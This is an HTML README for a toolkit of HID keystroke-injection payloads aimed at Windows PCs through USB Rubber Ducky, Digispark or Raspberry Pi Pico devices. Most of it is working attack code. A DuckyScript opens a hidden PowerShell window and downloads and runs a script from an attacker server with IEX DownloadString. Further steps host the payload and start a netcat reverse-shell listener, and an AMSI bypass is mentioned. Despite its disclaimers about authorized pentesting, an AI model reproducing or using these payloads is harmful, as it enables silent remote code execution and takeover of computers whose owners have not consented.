

<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
</head>
<body>
  <h1>HID-based PowerShell Payload Toolkit</h1>
  <h2>Automated Payload Delivery Using USB Rubber Ducky &amp; Raspberry Pi Pico</h2>

  <p>
    This toolkit provides ready-to-deploy DuckyScript (<code>.ducky</code>) payloads for use with USB Rubber Ducky, Digispark, or Pico HID attack platforms.<br>
    <strong>Not for manual execution—these are keyboard emulation scripts only.</strong>
  </p>
  <blockquote>
    <strong>For legal, authorized penetration testing and education only!</strong>
  </blockquote>

  <ol>
    <li>
      <h3>Quick Start</h3>
      <p><strong>Clone the Repository:</strong></p>
      <pre><code>git clone https://github.com/YOUR_USERNAME/hid-powershell-payloads.git
cd hid-powershell-payloads
</code></pre>
    </li>
    <li>
      <h3>Prepare Your Payloads</h3>
      <p><strong>Edit the Payloads</strong></p>
      <ul>
        <li>DuckyScript files (<code>payload.ducky</code>) are provided.</li>
        <li>Replace all placeholders (<code>YOUR_IP</code>, <code>PORT</code>, <code>YOUR_FILE.ps1</code>) in the scripts with your own attack server details.
          <pre><code>STRING IEX (New-Object Net.WebClient).DownloadString('http://YOUR_IP:PORT/YOUR_FILE.ps1')
</code></pre>
        </li>
        <li>Host your payload <code>.ps1</code> file(s) using a simple HTTP server:
          <pre><code>python3 -m http.server 8000
</code></pre>
        </li>
      </ul>
    </li>
    <li>
      <h3>Flash Ducky Script to Your Device</h3>
      <ul>
        <li><strong>For Rubber Ducky:</strong>
          <ul>
            <li>Convert your <code>.ducky</code> file to <code>inject.bin</code> using
              <a href="https://github.com/hak5darren/USB-Rubber-Ducky/wiki/duckencode" target="_blank">Hak5 DuckEncoder</a>:
              <pre><code>java -jar duckencode.jar -i payload.ducky -o inject.bin
</code></pre>
            </li>
            <li>Flash <code>inject.bin</code> onto your Rubber Ducky’s micro SD.</li>
          </ul>
        </li>
        <li><strong>For Raspberry Pi Pico, Digispark, etc.:</strong>
          <ul>
            <li>Convert <code>.ducky</code> to the correct format required by your firmware (e.g., Duckyscript to CircuitPython for Pico).</li>
            <li>Copy to device as per your toolkit’s guidelines.</li>
          </ul>
        </li>
      </ul>
    </li>
    <li>
      <h3>Plug in and Attack</h3>
      <ul>
        <li>Insert your HID device into the <strong>target Windows PC</strong>.</li>
        <li>The HID emulates keyboard input:
          <ul>
            <li>Opens <kbd>Win+R</kbd>, launches hidden PowerShell.</li>
            <li>Types/downloads/executes your remote payload—<strong>NO user interaction needed</strong>.</li>
          </ul>
        </li>
        <li>On your attacker machine, set up a Netcat listener (for reverse shells):
          <pre><code>nc -lvnp L_PORT
</code></pre>
          <p>Replace <code>L_PORT</code> with your port.</p>
        </li>
      </ul>
    </li>
    <li>
      <h3>Example DuckyScript Payload</h3>
      <pre><code>DELAY 1000
GUI r
DELAY 500
STRING powershell -WindowStyle Hidden
ENTER
DELAY 800
STRING IEX (New-Object Net.WebClient).DownloadString('http://YOUR_IP:PORT/YOUR_FILE.ps1')
ENTER
</code></pre>
      <ul>
        <li><strong>Edit:</strong> Change the URL to your IP/port/filename.</li>
        <li>Place the corresponding <code>.ps1</code> (e.g., reverse shell or AMSI bypass) on your server before use.</li>
      </ul>
    </li>
  </ol>

  <h3>Legal/Ethical Use</h3>
  <blockquote>
    These payloads automate attack delivery for red teamers, CTF players, and security researchers—not intended for manual use!<br>
    <strong>Never use on systems or networks without WRITTEN permission.</strong>
  </blockquote>
</body>
</html>
